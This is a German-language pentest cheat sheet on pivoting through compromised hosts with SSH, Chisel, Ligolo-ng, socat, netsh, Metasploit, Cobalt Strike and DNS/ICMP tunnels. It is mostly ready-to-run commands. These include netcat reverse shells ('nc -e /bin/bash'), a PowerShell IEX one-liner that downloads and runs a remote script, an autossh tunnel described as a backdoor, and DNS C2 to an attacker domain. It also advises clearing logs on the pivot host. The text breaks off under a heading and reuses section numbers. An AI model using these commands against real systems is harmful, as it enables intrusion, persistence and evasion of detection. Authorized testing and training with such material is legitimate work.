# Port Forwarding & Tunneling - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.

**Kontext**: Port Forwarding und Tunneling ermöglichen Zugriff auf Netzwerk-Segmente, die von der Attacker-Maschine (Kali) nicht direkt erreichbar sind. Pivoting über kompromittierte Hosts.

**Szenario**: Attacker (Kali) → Pivot Host (kompromittiert) → Internal Target

---

## Inhaltsverzeichnis
1. [SSH Tunneling (Linux)](#ssh-tunneling-linux)
2. [SSH über Windows (Plink/OpenSSH)](#ssh-über-windows-plinkssh)
3. [Chisel (Cross-Platform)](#chisel-cross-platform)
4. [Ligolo-ng (Modern Tunneling)](#ligolo-ng-modern-tunneling)
5. [Socat (Port Relay)](#socat-port-relay)
6. [Netsh (Windows Native)](#netsh-windows-native)
7. [PortProxy (Windows)](#portproxy-windows)
8. [Netcat Relays](#netcat-relays)
9. [Metasploit Pivoting](#metasploit-pivoting)
10. [Proxychains](#proxychains)
11. [SSHuttle](#sshuttle)
12. [Rpivot](#rpivot)
13. [reGeorg / Neo-reGeorg](#regeorg-neo-regeorg)
14. [ICMP Tunneling](#icmp-tunneling)
15. [DNS Tunneling](#dns-tunneling)
16. [HTTP/HTTPS Tunneling](#httphttps-tunneling)
17. [WireGuard / VPN Solutions](#wireguard-vpn-solutions)
18. [PowerShell Port Forward](#powershell-port-forward)
19. [Meterpreter Portfwd](#meterpreter-portfwd)
20. [Cobalt Strike Pivoting](#cobalt-strike-pivoting)
21. [Sliver Pivoting](#sliver-pivoting)
22. [SOCKS Proxies](#socks-proxies)
23. [Dynamic Port Forwarding](#dynamic-port-forwarding)
24. [Reverse Port Forwarding](#reverse-port-forwarding)
25. [Double Pivoting](#double-pivoting)

---

## SSH Tunneling (Linux)

**Beschreibung**: SSH ist das Standard-Tool für Port Forwarding. Funktioniert wenn SSH auf Pivot Host läuft.

### 1. Local Port Forward (ssh -L)
**Szenario**: Target Port auf Kali lokal verfügbar machen

```bash
# Basic Syntax:
ssh -L [local_port]:[target_host]:[target_port] user@pivot_host

# Beispiel: RDP von Target über Pivot
# Kali → Pivot → Target (RDP 3389)
ssh -L 3389:192.168.10.50:3389 user@pivot_host

# Zugriff von Kali:
xfreerdp /u:admin /p:pass /v:127.0.0.1:3389

# Beispiel: SMB von Target über Pivot
ssh -L 445:192.168.10.50:445 user@pivot_host

# Beispiel: Multiple Ports gleichzeitig
ssh -L 3389:target1:3389 -L 445:target2:445 -L 80:target3:80 user@pivot_host

# Mit Key-basierter Auth
ssh -i id_rsa -L 3389:target:3389 user@pivot_host

# Nur Tunnel (kein Shell)
ssh -N -L 3389:target:3389 user@pivot_host

# Background
ssh -f -N -L 3389:target:3389 user@pivot_host
```
**Port Flow**: Kali:3389 → Pivot → Target:3389

### 2. Remote Port Forward (ssh -R)
**Szenario**: Pivot Host exposed Service nach außen (zu Kali)

```bash
# Basic Syntax:
ssh -R [pivot_port]:[kali_ip]:[kali_port] user@pivot_host

# Beispiel: Kali Listener über Pivot erreichbar
# Reverse Shell von Target → Pivot → Kali
ssh -R 4444:127.0.0.1:4444 user@pivot_host

# Von Pivot kann nun:
nc -e /bin/bash pivot_host 4444
# → landet auf Kali 127.0.0.1:4444

# SMB Share von Kali über Pivot erreichbar
ssh -R 445:127.0.0.1:445 user@pivot_host

# Background
ssh -f -N -R 4444:127.0.0.1:4444 user@pivot_host
```
**Use Case**: Exfil, Reverse Shells, Kali Services für Internal Targets erreichbar machen

### 3. Dynamic Port Forward (ssh -D) - SOCKS Proxy
**Szenario**: SOCKS5 Proxy für flexible Routing

```bash
# SOCKS5 Proxy auf Kali Port 1080
ssh -D 1080 user@pivot_host

# Oder spezifische Bind Address
ssh -D 127.0.0.1:1080 user@pivot_host

# Background
ssh -f -N -D 1080 user@pivot_host

# Mit Compression (langsame Verbindungen)
ssh -C -D 1080 user@pivot_host

# Nutzung mit proxychains:
# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 192.168.10.0/24
proxychains crackmapexec smb 192.168.10.50 -u admin -p pass
proxychains firefox
```
**Port Flow**: Kali App → SOCKS Proxy (1080) → Pivot → Internal Network

### 4. SSH Jump Host (-J ProxyJump)
```bash
# Direct SSH via Jump Host
ssh -J pivot_user@pivot_host target_user@internal_target

# Multiple Jumps
ssh -J jump1,jump2,jump3 user@final_target

# Mit Port Forward
ssh -J pivot_host -L 3389:target:3389 user@internal_network_host
```

### 5. SSH Config File (~/.ssh/config)
```bash
# ~/.ssh/config
Host pivot
    HostName pivot_host_ip
    User pivot_user
    IdentityFile ~/.ssh/id_rsa

Host internal-target
    HostName 192.168.10.50
    User target_user
    ProxyJump pivot
    LocalForward 3389 192.168.10.50:3389
    DynamicForward 1080

# Dann einfach:
ssh internal-target
```

### 6. SSH über Non-Standard Port
```bash
ssh -p 2222 -D 1080 user@pivot_host
```

### 7. Reverse SSH Tunnel (Persistent)
```bash
# Auf Pivot Host (als Backdoor):
# Autossh für Auto-Reconnect
autossh -M 0 -f -N -R 2222:localhost:22 kali@attacker_kali_ip

# Auf Kali kann dann:
ssh -p 2222 pivot_user@localhost
# → landet auf Pivot
```

---

## SSH über Windows (Plink/SSH)

**Beschreibung**: Windows Pivot Hosts mit Plink (PuTTY) oder OpenSSH

### 8. Plink (PuTTY Link)
```cmd
# Plink Download: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

# Local Port Forward
plink.exe -L 3389:target:3389 user@kali_ip -pw password

# Dynamic SOCKS Proxy
plink.exe -D 1080 user@kali_ip -pw password

# Remote Port Forward
plink.exe -R 4444:127.0.0.1:4444 user@kali_ip -pw password

# Background (ohne Fenster)
plink.exe -N -L 3389:target:3389 user@kali_ip -pw password

# Mit SSH Key
plink.exe -i private_key.ppk -L 3389:target:3389 user@kali_ip
```

### 9. Windows OpenSSH (Native ab Windows 10/Server 2019)
```powershell
# SSH installiert prüfen
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

# Installieren
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

# Local Forward
ssh -L 3389:target:3389 user@kali_ip

# Dynamic Forward
ssh -D 1080 user@kali_ip

# Remote Forward
ssh -R 4444:127.0.0.1:4444 user@kali_ip
```

### 10. Reverse SSH Tunnel von Windows
```cmd
# Windows → Kali SSH Tunnel
plink.exe -R 4444:127.0.0.1:4444 -R 3389:127.0.0.1:3389 kali_user@kali_ip -pw password

# Dann auf Kali:
nc -lvnp 4444
xfreerdp /v:127.0.0.1:3389
```

---

## Chisel (Cross-Platform)

**Beschreibung**: Modern, schnell, über HTTP/HTTPS. Ideal für Windows + Linux Pivoting.

**Download**: https://github.com/jpillora/chisel

### 11. Chisel Server (auf Kali)
```bash
# Server starten
./chisel server -p 8000 --reverse

# Mit Authentication
./chisel server -p 8000 --reverse --auth user:password

# Verbose
./chisel server -p 8000 --reverse -v

# SOCKS5 Server
./chisel server -p 8000 --socks5
```

### 12. Chisel Client - Reverse SOCKS Proxy (empfohlen)
```bash
# Auf Pivot Host (Linux):
./chisel client kali_ip:8000 R:socks

# Auf Pivot Host (Windows):
chisel.exe client kali_ip:8000 R:socks

# Mit Auth:
chisel.exe client --auth user:password kali_ip:8000 R:socks

# Kali erstellt automatisch SOCKS5 Proxy auf 127.0.0.1:1080
# Nutzung mit proxychains:
proxychains nmap -sT 192.168.10.0/24
```
**Vorteil**: Ein Command, flexibel, kein SSH benötigt

### 13. Chisel Reverse Port Forward
```bash
# Server auf Kali:
./chisel server -p 8000 --reverse

# Client auf Pivot:
# Remote Port Forward: Kali 8080 → Target 80
./chisel client kali_ip:8000 R:8080:target_ip:80

# Zugriff von Kali:
curl http://127.0.0.1:8080
# → landet auf target_ip:80 via Pivot
```

### 14. Chisel Local Port Forward
```bash
# Server auf Pivot:
./chisel server -p 8000

# Client auf Kali:
./chisel client pivot_ip:8000 3389:target_ip:3389

# Zugriff:
xfreerdp /v:127.0.0.1:3389
```

### 15. Chisel über HTTPS (Encrypted)
```bash
# Server mit TLS:
./chisel server -p 8000 --reverse --tls-key key.pem --tls-cert cert.pem

# Client:
./chisel client https://kali_ip:8000 R:socks
```

### 16. Chisel Multiple Forwards
```bash
# Mehrere Ports gleichzeitig
./chisel client kali_ip:8000 R:3389:target1:3389 R:445:target2:445 R:socks
```

---

## Ligolo-ng (Modern Tunneling)

**Beschreibung**: Layer 3 Tunneling (TUN interface), sehr performant, modern.

**Download**: https://github.com/nicocha30/ligolo-ng

### 17. Ligolo-ng Setup
```bash
# === AUF KALI (Proxy) ===

# TUN Interface erstellen
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Proxy starten
./proxy -selfcert

# === AUF PIVOT HOST (Agent) ===

# Linux Agent:
./agent -connect kali_ip:11601 -ignore-cert

# Windows Agent:
agent.exe -connect kali_ip:11601 -ignore-cert

# === ZURÜCK AUF KALI (Proxy Console) ===

# Session auswählen
ligolo-ng » session
# Select agent

# Listener hinzufügen (für reverse shells)
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Routen hinzufügen (Internal Network via Pivot)
sudo ip route add 192.168.10.0/24 dev ligolo

# Start Tunnel
ligolo-ng » start

# === FERTIG ===
# Kali kann jetzt direkt auf 192.168.10.0/24 zugreifen!
nmap 192.168.10.50
xfreerdp /v:192.168.10.50
```
**Vorteil**: Komplettes Netzwerk-Routing, kein SOCKS Proxy nötig

### 18. Ligolo-ng Reverse Port Forward
```bash
# In Proxy Console:
listener_add --addr 0.0.0.0:8080 --to target_ip:80

# Zugriff von Kali:
curl http://kali_ip:8080
```

---

## Socat (Port Relay)

**Beschreibung**: Netcat on Steroids. Flexible Port Forwarding.

### 19. Socat Port Relay (TCP)
```bash
# Auf Pivot Host:
# Forward Pivot:8080 → Target:80
socat TCP-LISTEN:8080,fork TCP:target_ip:80

# Von Kali:
curl http://pivot_ip:8080
# → landet auf target_ip:80

# Bind auf alle Interfaces
socat TCP-LISTEN:8080,fork,reuseaddr TCP:target_ip:80
```

### 20. Socat Reverse Port Forward
```bash
# Auf Kali (Listener):
socat TCP-LISTEN:4444,fork TCP:127.0.0.1:5555

# Auf Pivot:
socat TCP:kali_ip:4444 TCP-LISTEN:5555,fork

# Target verbindet zu Pivot:5555 → landet auf Kali:4444
```

### 21. Socat mit Encryption (SSL)
```bash
# Server (Kali):
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:127.0.0.1:80

# Client (Pivot):
socat TCP-LISTEN:8080,fork OPENSSL:kali_ip:443,verify=0
```

### 22. Socat für UDP
```bash
# UDP Port Forward
socat UDP-LISTEN:53,fork UDP:target_ip:53
```

---

## Netsh (Windows Native)

**Beschreibung**: Windows native Port Forwarding (ab Windows XP/Server 2003)

### 23. Netsh Interface Portproxy
```cmd
# Port Forward aktivieren: Pivot:8080 → Target:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=target_ip

# Zeige alle Port Forwards
netsh interface portproxy show all

# Löschen
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Beispiel: RDP Forward
netsh interface portproxy add v4tov4 listenport=3390 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.10.50

# Von Kali:
xfreerdp /v:pivot_ip:3390
# → landet auf 192.168.10.50:3389

# Firewall Rule (benötigt)
netsh advfirewall firewall add rule name="Port Forward 3390" protocol=TCP dir=in localport=3390 action=allow
```
**Vorteil**: Native, kein Upload nötig
**Nachteil**: Benötigt Admin-Rechte

### 24. Netsh mit IPv6
```cmd
netsh interface portproxy add v6tov4 listenport=8080 listenaddress=:: connectport=80 connectaddress=target_ip
```

### 25. Netsh Persistent (Registry)
```cmd
# Port Forward bleibt nach Reboot
# Automatisch persistent wenn mit netsh erstellt
```

---

## PortProxy (Windows)

### 26. PortProxy über PowerShell
```powershell
# Äquivalent zu netsh
New-NetFirewallRule -DisplayName "PortProxy 8080" -Direction Inbound -LocalPort 8080 -Protocol TCP -Action Allow

# Netsh wrapper
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.10.50
```

---

## Netcat Relays

### 27. Netcat Named Pipe Relay (Linux)
```bash
# Auf Pivot:
mknod backpipe p
nc -l -p 8080 0<backpipe | nc target_ip 80 1>backpipe

# Von Kali:
nc pivot_ip 8080
# → landet auf target_ip:80
```

### 28. Netcat Reverse Relay
```bash
# Kali Listener:
nc -lvnp 4444

# Pivot Relay:
mknod backpipe p
nc kali_ip 4444 0<backpipe | nc -l -p 5555 1>backpipe

# Target:
nc pivot_ip 5555 -e /bin/bash
# → Shell landet auf Kali:4444
```

---

## Metasploit Pivoting

### 29. Meterpreter Portfwd
```ruby
# In Meterpreter Session:
portfwd add -l 3389 -p 3389 -r target_ip

# Zeige Forwards
portfwd list

# Löschen
portfwd delete -l 3389

# Von Kali:
xfreerdp /v:127.0.0.1:3389

# Reverse Port Forward
portfwd add -R -l 4444 -p 4444 -L kali_ip
```

### 30. Autoroute (Metasploit)
```ruby
# In Meterpreter:
run autoroute -s 192.168.10.0/24

# Zeige Routes
run autoroute -p

# Dann andere Metasploit Modules nutzen:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.0/24
run
```

### 31. Socks Proxy (Metasploit)
```ruby
# Auxiliary Module
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Mit proxychains nutzen
proxychains nmap -sT 192.168.10.0/24
```

---

## Proxychains

### 32. Proxychains Configuration - Detailliert
```bash
# /etc/proxychains4.conf
# oder ~/.proxychains/proxychains.conf

# === CHAIN MODI ===

# Dynamic chain (empfohlen - überspringt tote Proxies)
dynamic_chain

# Strict chain (alle Proxies müssen funktionieren)
# strict_chain

# Random chain (zufällige Reihenfolge)
# random_chain

# === WICHTIGE OPTIONEN ===

# Proxy DNS requests (WICHTIG für interne Namen!)
proxy_dns

# TCP timeouts
tcp_connect_time_out 8000
tcp_read_time_out 15000

# Quiet mode (weniger output)
# quiet_mode

# === PROXY LIST ===

[ProxyList]
# SOCKS5 (SSH -D oder Chisel)
socks5 127.0.0.1 1080

# SOCKS4
# socks4 127.0.0.1 1080

# HTTP Proxy
# http 127.0.0.1 8080

# Mehrere Proxies für Double Pivot:
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```

### 33. Proxychains Verwendung
```bash
# Basic Usage
proxychains <tool> <arguments>

# Mit spezifischer Config
proxychains -f /path/to/proxychains.conf <tool>

# Verbose Mode (Debugging)
proxychains -v curl http://target

# Quiet Mode
proxychains -q nmap -sT 192.168.10.50

# Beispiele:
proxychains nmap -sT -Pn 192.168.10.0/24
proxychains firefox
proxychains curl http://192.168.10.50
proxychains crackmapexec smb 192.168.10.0/24
proxychains sqlmap -u "http://192.168.10.50/page.php?id=1"
proxychains enum4linux 192.168.10.10
proxychains gobuster dir -u http://192.168.10.50 -w /usr/share/wordlists/dirb/common.txt

# Metasploit mit proxychains
proxychains msfconsole
msf6 > setg Proxies socks5:127.0.0.1:1080
```

### 34. Proxychains Troubleshooting

**Problem: nmap funktioniert nicht**
```bash
# ❌ FALSCH - SYN Scan funktioniert NICHT über SOCKS
proxychains nmap -sS 192.168.10.50

# ✅ RICHTIG - TCP Connect Scan + Skip Ping
proxychains nmap -sT -Pn 192.168.10.50

# ✅ Für bestimmte Ports
proxychains nmap -sT -Pn -p 80,443,445,3389 192.168.10.50

# ✅ Mit Version Detection (funktioniert, aber langsam)
proxychains nmap -sT -Pn -sV -p 80,443 192.168.10.50

# ❌ NICHT über Proxy möglich:
# - UDP Scans (-sU)
# - OS Detection (-O)
# - Aggressive Scan (-A) - zu viele komplexe Pakete
```

**Alternativen zu nmap über Proxychains:**
```bash
# Port-Check mit nc (schneller!)
proxychains nc -zv 192.168.10.50 80
proxychains nc -zv 192.168.10.50 445

# Port-Scan Loop
for port in 80 443 445 3389 5985; do
  proxychains nc -zv 192.168.10.50 $port 2>&1 | grep succeeded
done

# HTTP-Check
proxychains curl -I http://192.168.10.50

# SMB-Enumeration (besser als nmap!)
proxychains crackmapexec smb 192.168.10.50
```

**Problem: DNS Resolution**
```bash
# Stelle sicher dass proxy_dns aktiviert ist:
# /etc/proxychains4.conf:
proxy_dns

# Test mit curl
proxychains curl http://internal-server.local
```

**Problem: Timeout Errors**
```bash
# Timeouts erhöhen in /etc/proxychains4.conf:
tcp_connect_time_out 10000
tcp_read_time_out 20000
```

**Problem: Strict chain vs Dynamic chain**
```bash
# strict_chain: Stoppt wenn ein Proxy nicht antwortet
# dynamic_chain: Überspringt tote Proxies (empfohlen)

# In /etc/proxychains4.conf:
dynamic_chain
```

**SOCKS Proxy testen:**
```bash
# Prüfen ob SOCKS proxy läuft
netstat -tlnp | grep 1080
ss -tlnp | grep 1080

# Direkt mit curl testen
curl --socks5 127.0.0.1:1080 http://192.168.10.50

# SSH Tunnel prüfen
ps aux | grep "ssh -D"
```

### 35. Tools Kompatibilität mit Proxychains

**✅ Funktionieren GUT:**
- `curl`, `wget`
- `nmap -sT` (nur TCP connect scan!)
- `gobuster`, `dirb`, `ffuf`, `feroxbuster`
- `sqlmap`
- `firefox`, `chromium`
- `ssh`, `scp`, `sftp`
- `crackmapexec` / `netexec`
- `enum4linux`, `enum4linux-ng`
- `smbclient`, `smbmap`
- `hydra`
- `nikto`
- `wpscan`
- `git clone`
- `impacket-* tools` (GetUserSPNs, psexec, etc.)

**❌ Funktionieren NICHT:**
- `nmap -sS` (SYN scan - benötigt raw sockets)
- `nmap -sU` (UDP scan)
- `ping`, `traceroute` (ICMP)
- `masscan` (raw sockets)
- Tools die raw sockets nutzen
- `nmap -O` (OS detection)

### 36. Proxychains Performance Optimierung
```bash
# Timeouts reduzieren für schnellere Scans
# /etc/proxychains4.conf
tcp_connect_time_out 3000
tcp_read_time_out 8000

# SSH mit Compression für bessere Performance
ssh -D 1080 -N -f -C user@pivot_host

# SSH Keep-Alive gegen Timeouts
ssh -D 1080 -N -f -o ServerAliveInterval=60 -o ServerAliveCountMax=3 user@pivot_host
```

### 37. Proxychains Multiple Proxies (Chain)
```bash
# Chain mehrere SOCKS Proxies (Double Pivot)
# /etc/proxychains4.conf:
[ProxyList]
socks5 127.0.0.1 1080  # Pivot 1
socks5 127.0.0.1 1081  # Pivot 2

# Traffic: Kali → Proxy1 (1080) → Proxy2 (1081) → Target
```

### 38. Proxychains Quick Reference
```bash
# Setup SSH SOCKS Proxy
ssh -D 1080 -N -f user@pivot_host

# Config /etc/proxychains4.conf
dynamic_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080

# Usage - Wichtigste Commands
proxychains nmap -sT -Pn -p 80,443,445,3389 TARGET
proxychains curl http://TARGET
proxychains crackmapexec smb TARGET
proxychains firefox

# Debugging
proxychains -v curl http://TARGET
netstat -tlnp | grep 1080
curl --socks5 127.0.0.1:1080 http://TARGET
```

---

## SSHuttle

**Beschreibung**: VPN-like über SSH, transparent Layer 3

### 35. SSHuttle Basic
```bash
# Alle Traffic zu 192.168.10.0/24 via Pivot
sshuttle -r user@pivot_host 192.168.10.0/24

# Verbose
sshuttle -vr user@pivot_host 192.168.10.0/24

# Exclude Ranges
sshuttle -r user@pivot_host 192.168.10.0/24 -x 192.168.10.5

# Include DNS
sshuttle --dns -r user@pivot_host 192.168.10.0/24

# Auto-detect Remote Networks
sshuttle -r user@pivot_host 0/0 --auto-nets

# Mit SSH Key
sshuttle -r user@pivot_host 192.168.10.0/24 -e "ssh -i id_rsa"
```
**Vorteil**: Transparent, kein SOCKS Proxy nötig

---

## Rpivot

**Beschreibung**: Reverse SOCKS Proxy, gut für Firewall Bypass

### 36. Rpivot Server (Kali)
```bash
# Server
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0

# Client auf Pivot:
python client.py --server-ip kali_ip --server-port 9999

# SOCKS Proxy auf Kali:1080
proxychains nmap 192.168.10.0/24
```

---

## reGeorg / Neo-reGeorg

**Beschreibung**: SOCKS Proxy via HTTP Tunnel (Webshell-based)

### 37. Neo-reGeorg Setup
```bash
# 1. Upload Tunnel Script zu Webserver:
# tunnel.aspx / tunnel.jsp / tunnel.php

# 2. Start Client auf Kali:
python neoreg.py -k password -u http://pivot_webserver/tunnel.aspx

# SOCKS Proxy auf 127.0.0.1:1080
proxychains nmap 192.168.10.0/24
```
**Use Case**: Wenn nur HTTP/HTTPS Zugriff auf Pivot (Webshell Scenario)

---

## ICMP Tunneling

### 38. icmpsh (ICMP Shell)
```bash
# Server auf Kali:
python icmpsh_m.py kali_ip target_ip

# Client auf Windows Target:
icmpsh.exe -t kali_ip

# Shell über ICMP Packets
```

### 39. ptunnel (ICMP Tunnel)
```bash
# Server auf Kali:
ptunnel -x password

# Client auf Pivot:
ptunnel -p kali_ip -lp 8080 -da target_ip -dp 80 -x password

# Port Forward über ICMP
```
**Use Case**: Firewalls, die nur ICMP erlauben

---

## DNS Tunneling

### 40. dnscat2
```bash
# Server auf Kali:
dnscat2-server attacker.domain.com

# Client auf Pivot:
./dnscat attacker.domain.com

# C2 Channel über DNS
```

### 41. iodine
```bash
# Server auf Kali:
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Client auf Pivot:
iodine -f -P password tunnel.attacker.com

# TUN Interface: 10.0.0.x
# Route über DNS Tunnel
```

---

## HTTP/HTTPS Tunneling

### 42. ABPTTS (HTTP Tunnel)
```bash
# HTTP/HTTPS Tunnel via Webshell
# Upload abpttsclient/abpttsserver
python abpttsfactory.py -o webshell
# Upload webshell.aspx

# Client:
python abpttsclient.py -c config.txt -u http://target/webshell.aspx -f 127.0.0.1:1080/socks
```

### 43. Tunna (HTTP Tunnel)
```bash
# HTTP Tunneling tool
python proxy.py -u http://target/conn.aspx -l 1234 -r 3389 -v

# RDP über HTTP Tunnel:
xfreerdp /v:127.0.0.1:1234
```

---

## WireGuard / VPN Solutions

### 44. WireGuard (Modern VPN)
```bash
# Setup WireGuard auf Kali und Pivot
# Kali Config: /etc/wireguard/wg0.conf
[Interface]
Address = 10.0.0.1/24
PrivateKey = <kali_private_key>
ListenPort = 51820

[Peer]
PublicKey = <pivot_public_key>
AllowedIPs = 10.0.0.2/32, 192.168.10.0/24

# Pivot Config:
[Interface]
Address = 10.0.0.2/24
PrivateKey = <pivot_private_key>

[Peer]
PublicKey = <kali_public_key>
Endpoint = kali_ip:51820
AllowedIPs = 0.0.0.0/0

# Start:
wg-quick up wg0

# Kali kann jetzt 192.168.10.0/24 via 10.0.0.2 erreichen
```

### 45. OpenVPN
```bash
# OpenVPN Server auf Kali
# Client auf Pivot
# Full VPN Solution
```

---

## PowerShell Port Forward

### 46. PowerShell TCP Relay
```powershell
# Port Forward Script (PowerShell)
$LocalPort = 8080
$RemoteHost = "192.168.10.50"
$RemotePort = 80

$listener = [System.Net.Sockets.TcpListener]$LocalPort
$listener.Start()

while($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()

    $remoteClient = New-Object System.Net.Sockets.TcpClient($RemoteHost, $RemotePort)
    $remoteStream = $remoteClient.GetStream()

    # Relay traffic
    # (Simplified - full implementation needed)
}
```

### 47. PowerShell via Invoke-Command
```powershell
# Remote PowerShell Tunnel
Invoke-Command -ComputerName pivot_host -ScriptBlock {
    # Setup Port Forward on Pivot
    netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=target_ip
}
```

---

## Meterpreter Portfwd

### 48. Meterpreter Advanced Portfwd
```ruby
# In Meterpreter:
portfwd add -l 3389 -p 3389 -r 192.168.10.50
portfwd add -l 445 -p 445 -r 192.168.10.50
portfwd add -l 80 -p 80 -r 192.168.10.50

# Flush all
portfwd flush
```

---

## Cobalt Strike Pivoting

### 49. Cobalt Strike SOCKS Proxy
```
# In Beacon Console:
socks 1080

# In Kali:
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap 192.168.10.0/24
```

### 50. Cobalt Strike rportfwd
```
# Reverse Port Forward
rportfwd 8080 target_ip 80

# Kali:8080 → Beacon → target_ip:80
```

---

## Sliver Pivoting

### 51. Sliver Portfwd
```
# In Sliver Session:
portfwd add --remote target_ip:80 --bind 127.0.0.1:8080

# Kali:
curl http://127.0.0.1:8080
```

### 52. Sliver SOCKS
```
# In Sliver:
socks5 start

# Proxychains nutzen
```

---

## SOCKS Proxies

### 53. Dante (SOCKS Server)
```bash
# Install auf Pivot:
apt install dante-server

# Config: /etc/danted.conf
internal: eth0 port = 1080
external: eth0

socksmethod: none

client pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
}

socks pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
}

# Start:
systemctl start danted

# Von Kali:
proxychains nmap 192.168.10.0/24
```

### 54. Microsocks (Lightweight)
```bash
# Auf Pivot:
./microsocks -i 0.0.0.0 -p 1080

# Von Kali:
proxychains curl http://192.168.10.50
```

---

## Dynamic Port Forwarding

### 55. SSH Dynamic via Jump Host
```bash
# Double Pivot SOCKS
ssh -J pivot1 -D 1080 pivot2

# Dann via proxychains auf final network
```

---

## Reverse Port Forwarding

### 56. Reverse Port Forward Scenarios
```bash
# Reverse Shell via Reverse Port Forward
# Kali Listener:
nc -lvnp 4444

# SSH Reverse Forward auf Pivot:
ssh -R 5555:127.0.0.1:4444 kali_user@kali_ip

# Internal Target verbindet zu Pivot:5555
nc pivot_ip 5555 -e /bin/bash
# → Shell landet auf Kali:4444
```

---

## Double Pivoting

### 57. Double Pivot SSH
```bash
# Kali → Pivot1 → Pivot2 → Internal Network

# Schritt 1: Kali → Pivot1
ssh -D 1080 user@pivot1

# Schritt 2: Via Pivot1 → Pivot2
proxychains ssh -D 1081 user@pivot2

# Schritt 3: Proxychains auf 1081
# /etc/proxychains4.conf:
socks5 127.0.0.1 1081

proxychains nmap 192.168.20.0/24
```

### 58. Chisel Double Pivot
```bash
# Server auf Kali:
./chisel server -p 8000 --reverse

# Pivot1:
./chisel client kali_ip:8000 R:8001:127.0.0.1:8001

# Pivot2:
./chisel server -p 8001 --reverse

# Pivot2:
./chisel client pivot1_ip:8001 R:socks

# SOCKS auf Kali:1080 → Pivot1 → Pivot2 → Final Network
```

### 59. Ligolo-ng Double Pivot
```bash
# Agent auf Pivot1 → Kali Proxy
# Agent auf Pivot2 → Kali Proxy via Pivot1 Listener

# Session 1: Pivot1
ligolo-ng » session 1
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# Session 2: Pivot2 verbindet zu Pivot1:11601
# Routes:
sudo ip route add 192.168.10.0/24 dev ligolo
sudo ip route add 192.168.20.0/24 dev ligolo
```

---

## Szenario-basierte Beispiele

### 60. Szenario 1: RDP via SSH
```bash
# Kali → Pivot (SSH) → Target (RDP)
ssh -L 3389:target_ip:3389 user@pivot_ip
xfreerdp /v:127.0.0.1:3389 /u:admin /p:pass
```

### 61. Szenario 2: SMB via Chisel
```bash
# Server auf Kali:
./chisel server -p 8000 --reverse

# Client auf Windows Pivot:
chisel.exe client kali_ip:8000 R:445:target_ip:445

# Kali:
smbclient -L 127.0.0.1 -U admin
```

### 62. Szenario 3: Nmap Scan via SOCKS
```bash
# SSH Dynamic Forward:
ssh -D 1080 user@pivot_ip

# Nmap via proxychains:
proxychains nmap -sT -Pn -p 445,3389,80,443 192.168.10.0/24
```

### 63. Szenario 4: HTTP Service via Socat
```bash
# Pivot Host:
socat TCP-LISTEN:8080,fork TCP:internal_web_server:80

# Kali:
curl http://pivot_ip:8080
```

### 64. Szenario 5: Reverse Shell via Netsh
```bash
# Kali Listener:
nc -lvnp 4444

# Windows Pivot:
netsh interface portproxy add v4tov4 listenport=5555 connectport=4444 connectaddress=kali_ip

# Internal Target:
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://pivot_ip/rev.ps1')"
# rev.ps1 verbindet zu pivot_ip:5555 → Kali:4444
```

---

## Tool-Vergleich

| Tool | Platform | Stealth | Speed | Setup |
|------|----------|---------|-------|-------|
| SSH | Linux | Medium | Fast | Easy |
| Chisel | Win/Linux | High | Fast | Easy |
| Ligolo-ng | Win/Linux | High | Very Fast | Medium |
| Netsh | Windows | Low | Fast | Easy |
| Socat | Linux | Medium | Fast | Easy |
| SSHuttle | Linux | Medium | Fast | Easy |
| Metasploit | Win/Linux | Low | Slow | Easy |

---

## Best Practices

### OPSEC Considerations:
1. **Encrypted Tunnels**: Immer TLS/SSH nutzen
2. **Non-Standard Ports**: 8443 statt 443, 8080 statt 80
3. **Persistence**: Autossh, systemd services für Tunnels
4. **Cleanup**: Port Forwards nach Engagement löschen
5. **Logging**: Logs auf Pivot Host bereinigen

### Performance:
- **Compression**: SSH `-C` flag für langsame Links
- **KeepAlive**: Tunnel stabil halten
- **MTU Tuning**: Bei VPN/Tunneling wichtig

### Troubleshooting:
```bash
# Check Port ist offen:
ss -tlnp | grep 1080
netstat -an | findstr 1080

# Test SOCKS Proxy:
curl --socks5 127.0.0.1:1080 http://192.168.10.50

# SSH Tunnel Debug:
ssh -vvv -D 1080 user@pivot

# Firewall Check auf Pivot:
iptables -L -n
netsh advfirewall firewall show rule name=all
```

---

## Quick Reference

### SSH Commands:
```bash
# Local Forward:   ssh -L 8080:target:80 pivot
# Remote Forward:  ssh -R 8080:localhost:80 pivot
# Dynamic (SOCKS): ssh -D 1080 pivot
# Jump:            ssh -J pivot target
```

### Chisel Commands:
```bash
# Server:          ./chisel server -p 8000 --reverse
# Reverse SOCKS:   ./chisel client kali:8000 R:socks
# Reverse Forward: ./chisel client kali:8000 R:8080:target:80
```

### Netsh Commands:
```cmd
